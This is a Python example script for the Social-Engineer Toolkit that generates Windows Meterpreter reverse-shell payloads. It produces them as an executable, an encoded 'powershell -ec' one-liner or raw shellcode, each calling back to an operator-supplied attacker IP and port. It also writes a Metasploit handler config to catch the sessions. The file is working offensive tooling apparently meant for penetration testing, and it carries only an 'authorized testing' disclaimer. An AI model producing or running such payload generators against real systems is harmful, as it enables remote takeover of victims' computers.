#!/usr/bin/env python3
"""
Example: Standalone Payload Generator
Social-Engineer Toolkit (SET)

This example demonstrates how to generate various types of
payloads using SET's payload generation APIs.

DISCLAIMER: For authorized testing only!
"""

from src.core.setcore import *
import sys
import os

def generate_simple_payload():
    """
    Generate a simple Meterpreter reverse TCP payload
    """
    print_status("Generating Meterpreter Reverse TCP Payload")
    
    # Get configuration
    attacker_ip = input(setprompt(["0"], "Enter your IP address for reverse connection"))
    
    # Validate IP
    if not validate_ip(attacker_ip):
        print_warning("Invalid IP format, attempting to use anyway")
    
    listener_port = input(setprompt(["0"], "Enter listener port [443]"))
    if not listener_port:
        listener_port = "443"
    
    print_info(f"Configuration: {attacker_ip}:{listener_port}")
    
    # Update options
    update_options(f"IPADDR={attacker_ip}")
    update_options(f"PORT={listener_port}")
    update_options("PAYLOADGEN=SOLO")
    
    # Set payload type
    payload_type = "windows/meterpreter/reverse_tcp"
    
    with open(userconfigpath + "metasploit.payload", "w") as f:
        f.write(payload_type)
    
    print_status(f"Payload type: {payload_type}")
    
    # Generate payload
    try:
        sys.path.append(definepath() + "/src/core/payloadgen")
        import solo
        
        # Check if payload was created
        payload_path = userconfigpath + "msf.exe"
        if os.path.isfile(payload_path):
            print_status("Payload generated successfully!")
            print_info(f"Payload saved to: {payload_path}")
            
            # Display file size
            size = os.path.getsize(payload_path)
            print_info(f"Payload size: {size} bytes")
            
            return payload_path
        else:
            print_error("Payload generation failed")
            return None
            
    except Exception as e:
        print_error(f"Error generating payload: {str(e)}")
        log(e)
        return None

def generate_powershell_payload():
    """
    Generate a PowerShell payload
    """
    print_status("Generating PowerShell Payload")
    
    # Get configuration
    attacker_ip = input(setprompt(["0"], "Enter your IP address"))
    if not validate_ip(attacker_ip):
        print_warning("Invalid IP, attempting anyway")
    
    listener_port = input(setprompt(["0"], "Enter listener port [443]"))
    if not listener_port:
        listener_port = "443"
    
    print_info(f"Configuration: {attacker_ip}:{listener_port}")
    
    # Choose payload type
    print("")
    print("Select PowerShell payload type:")
    print("  1) Meterpreter Reverse TCP")
    print("  2) Meterpreter Reverse HTTPS")
    print("  3) Meterpreter Reverse HTTP")
    
    choice = input(setprompt(["0"], "Select option [2]"))
    if not choice:
        choice = "2"
    
    # Map choice to payload
    payload_map = {
        "1": "windows/meterpreter/reverse_tcp",
        "2": "windows/meterpreter/reverse_https",
        "3": "windows/meterpreter/reverse_http"
    }
    
    payload = payload_map.get(choice, "windows/meterpreter/reverse_https")
    print_status(f"Using payload: {payload}")
    
    try:
        # Generate PowerShell payload
        ps_payload = generate_powershell_alphanumeric_payload(
            payload,
            attacker_ip,
            listener_port,
            ""
        )
        
        print_status("PowerShell payload generated successfully!")
        print_info("Base64 encoded payload ready for execution")
        
        # Save to file
        ps_file = userconfigpath + "powershell_payload.txt"
        with open(ps_file, "w") as f:
            f.write(f"powershell -ec {ps_payload}\n")
        
        print_status(f"Payload saved to: {ps_file}")
        print_info("Execute on target with:")
        print(f"  powershell -ec {ps_payload[:50]}...")
        
        return ps_payload
        
    except Exception as e:
        print_error(f"Error generating PowerShell payload: {str(e)}")
        log(e)
        return None

def generate_shellcode():
    """
    Generate raw shellcode
    """
    print_status("Generating Raw Shellcode")
    
    # Get configuration
    attacker_ip = input(setprompt(["0"], "Enter your IP address"))
    listener_port = input(setprompt(["0"], "Enter listener port [443]"))
    if not listener_port:
        listener_port = "443"
    
    print_info(f"Configuration: {attacker_ip}:{listener_port}")
    
    try:
        # Generate shellcode
        shellcode = metasploit_shellcode(
            "windows/meterpreter/reverse_tcp",
            attacker_ip,
            listener_port
        )
        
        # Replace IP and port
        shellcode = shellcode_replace(attacker_ip, listener_port, shellcode)
        
        print_status("Shellcode generated successfully!")
        
        # Save to file
        shellcode_file = userconfigpath + "shellcode.txt"
        with open(shellcode_file, "w") as f:
            f.write(shellcode)
        
        print_info(f"Shellcode saved to: {shellcode_file}")
        print_info(f"Shellcode length: {len(shellcode)} bytes")
        print_info("First 100 bytes:")
        print(f"  {shellcode[:100]}...")
        
        return shellcode
        
    except Exception as e:
        print_error(f"Error generating shellcode: {str(e)}")
        log(e)
        return None

def create_metasploit_listener(ip, port, payload):
    """
    Create Metasploit listener configuration
    """
    print_status("Creating Metasploit listener configuration")
    
    config_file = userconfigpath + "listener.rc"
    
    with open(config_file, "w") as f:
        f.write("use exploit/multi/handler\n")
        f.write(f"set PAYLOAD {payload}\n")
        f.write(f"set LHOST {ip}\n")
        f.write(f"set LPORT {port}\n")
        f.write("set ExitOnSession false\n")
        f.write("exploit -j\n")
    
    print_status(f"Listener configuration saved to: {config_file}")
    print_info("Start listener with:")
    print(f"  msfconsole -r {config_file}")

def main():
    """
    Main function
    """
    # Display banner
    print_status("Standalone Payload Generator Example")
    print_status("Social-Engineer Toolkit (SET)")
    print_warning("For authorized testing only!")
    print("")
    
    # Menu
    print("Select payload type to generate:")
    print("  1) Windows Meterpreter Executable")
    print("  2) PowerShell Payload")
    print("  3) Raw Shellcode")
    print("  4) Exit")
    print("")
    
    choice = input(setprompt(["0"], "Select option"))
    
    if choice == "1":
        payload_path = generate_simple_payload()
        if payload_path:
            print_status("="*70)
            print_status("Payload Generation Complete!")
            print_info(f"Executable: {payload_path}")
            
            # Ask about listener
            listener = yesno_prompt(["0"], "Create Metasploit listener config? [yes|no]")
            if listener == "YES":
                ip = check_options("IPADDR=")
                port = check_options("PORT=")
                create_metasploit_listener(ip, port, "windows/meterpreter/reverse_tcp")
            
    elif choice == "2":
        ps_payload = generate_powershell_payload()
        if ps_payload:
            print_status("="*70)
            print_status("PowerShell Payload Generation Complete!")
            
            # Ask about listener
            listener = yesno_prompt(["0"], "Create Metasploit listener config? [yes|no]")
            if listener == "YES":
                ip = check_options("IPADDR=")
                port = check_options("PORT=")
                # Determine payload type based on previous choice
                create_metasploit_listener(ip, port, "windows/meterpreter/reverse_https")
            
    elif choice == "3":
        shellcode = generate_shellcode()
        if shellcode:
            print_status("="*70)
            print_status("Shellcode Generation Complete!")
            print_info("Use this shellcode in your custom exploit")
            
    elif choice == "4":
        print_info("Exiting...")
        
    else:
        print_error("Invalid choice")
    
    # Cleanup
    return_continue()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_warning("\nOperation cancelled by user")
        cleanup_routine()
        sys.exit(0)
    except Exception as e:
        print_error(f"Unexpected error: {str(e)}")
        log(e)
        cleanup_routine()
        sys.exit(1)
